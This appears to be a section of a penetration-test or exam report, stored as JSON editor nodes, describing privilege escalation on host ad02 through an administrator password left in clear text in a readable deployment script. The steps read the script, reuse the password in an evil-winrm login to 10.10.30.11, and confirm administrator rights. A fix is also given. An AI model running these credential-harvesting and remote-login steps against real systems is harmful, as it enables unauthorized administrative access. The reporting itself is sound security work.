{"type":"heading","attrs":{"level":2,"source":"phase:h-exam-ad02:privesc:f-exam-deploy","gen":"892adea5"},"content":[{"type":"text","text":"Privilege escalation: Local administrator password in a deployment script on ad02"}]}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability explanation:","marks":[{"type":"bold"}]},{"type":"text","text":" C:\\\\Scripts\\\\deploy.ps1 is readable by every domain user and holds svc_deploy's password in clear text. svc_deploy is a local administrator on ad02."}],"attrs":{"source":"finding:f-exam-deploy:explanation","gen":"11cc2072"}}
{"type":"paragraph","content":[{"type":"text","text":"Vulnerability fix:","marks":[{"type":"bold"}]},{"type":"text","text":" Use a group-managed service account for the deployment. Restrict C:\\\\Scripts to administrators and rotate svc_deploy's password."}],"attrs":{"source":"finding:f-exam-deploy:fix","gen":"913cd3ba"}}
{"type":"paragraph","attrs":{"source":"finding:f-exam-deploy:severity","gen":"8372158f"},"content":[{"type":"text","text":"Severity:","marks":[{"type":"bold"}]},{"type":"text","text":" High"}]}
{"type":"paragraph","attrs":{"source":"phase-steps:h-exam-ad02","gen":"8ec36930"},"content":[{"type":"text","text":"Steps to reproduce:","marks":[{"type":"bold"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-ad02-deploy:title","gen":"2fc43d51"},"content":[{"type":"text","text":"Deployment script with svc_deploy's password:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ad02-deploy:0:command","gen":"4e7bda18"},"content":[{"type":"text","text":"type C:\\\\Scripts\\\\deploy.ps1"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ad02-deploy:0:output","gen":"e583fcf7"},"content":[{"type":"text","text":"# Nightly package deploy to the app servers\\n$user = 'exam\\\\svc_deploy'\\n$pass = ConvertTo-SecureString 'D3ploy!2026' -AsPlainText -Force\\n$cred = New-Object System.Management.Automation.PSCredential($user, $pass)\\nInvoke-Command -ComputerName ad02 -Credential $cred -ScriptBlock { & C:\\\\Deploy\\\\run.ps1 }"}]}]}
{"type":"list","attrs":{"kind":"ordered"},"content":[{"type":"paragraph","attrs":{"source":"entry:l-exam-ad02-admin:title","gen":"b153bbf3"},"content":[{"type":"text","text":"Svc_deploy is a local administrator on ad02:"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ad02-admin:0:command","gen":"69496d0c"},"content":[{"type":"text","text":"evil-winrm -i 10.10.30.11 -u svc_deploy -p 'D3ploy!2026'"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ad02-admin:0:output","gen":"d4f7e9c9"},"content":[{"type":"text","text":"Evil-WinRM shell v3.5\\n\\nInfo: Establishing connection to remote endpoint"}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ad02-admin:1:command","gen":"aeebd526"},"content":[{"type":"text","text":"whoami /groups | findstr /i \\"Administrators\\""}]},{"type":"codeBlock","attrs":{"language":"","source":"entry:l-exam-ad02-admin:1:output","gen":"45707573"},"content":[{"type":"text","text":"BUILTIN\\\\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner"}]}]}
